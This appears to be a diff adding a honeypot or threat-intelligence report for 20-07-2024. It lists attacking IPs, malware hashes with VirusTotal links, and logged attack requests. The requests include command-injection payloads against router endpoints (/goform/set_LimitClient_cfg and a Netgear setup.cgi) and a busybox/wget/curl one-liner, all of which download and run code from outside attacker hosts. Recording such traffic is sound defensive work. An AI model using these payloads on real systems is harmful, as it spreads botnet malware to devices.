@@ -1,0 +1,94 @@
+Top 5 IPs for 20-07-2024 :
+
+170.64.236.247
+3.148.115.244
+222.74.97.226
+119.187.164.226
+59.178.41.22
+
+Malware Observed:
+
+59c176301eae9eb5ba816276563636b63dc78795aaaaecea6ee4759cca566bb1
+https://www.virustotal.com/gui/file/59c176301eae9eb5ba816276563636b63dc78795aaaaecea6ee4759cca566bb1
+
+
+52022b849f181cdd4e2a256c9e3582ca0724c30b68a6db66423502516d1abf66
+https://www.virustotal.com/gui/file/52022b849f181cdd4e2a256c9e3582ca0724c30b68a6db66423502516d1abf66
+
+
+c26a29798752a80de5cf9f2e2bc9d1f1a780b93ca4ed2edf6e18c2d8d4308610
+https://www.virustotal.com/gui/file/c26a29798752a80de5cf9f2e2bc9d1f1a780b93ca4ed2edf6e18c2d8d4308610
+
+
+Commands/exploits observed:
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Host: <Host IP>
+User-Agent: Linux Gnu (cow)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 132
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf blink; wget http://1.13.102.222/blink; chmod 777 blink; ./blink blink; rm -rf blink;
+
+
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.206.181.171:41254/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+
+
+GET /where/w.sh HTTP/1.1
+Host: 103.162.20.69
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /where/c.sh HTTP/1.1
+Host: 103.162.20.69
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /where/wget.sh HTTP/1.1
+Host: 103.162.20.69
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /where/wget.sh HTTP/1.1
+Host: 103.162.20.69
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /where/wget.sh HTTP/1.1
+Host: 103.162.20.69
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+
+
+
+cd /data/local/tmp/; busybox wget http://103.162.20.69/where/w.sh; sh w.sh; curl http://103.162.20.69/where/c.sh; sh c.sh; wget http://103.162.20.69/where/wget.sh; sh wget.sh; curl http://103.162.20.69/where/wget.sh; sh wget.sh; busybox wget http://103.162.20.69/where/wget.sh; sh wget.sh; busybox curl http://103.162.20.69/where/wget.sh; sh wget.sh"
+
+
+
+
+
+
+
+
+
+
+
+
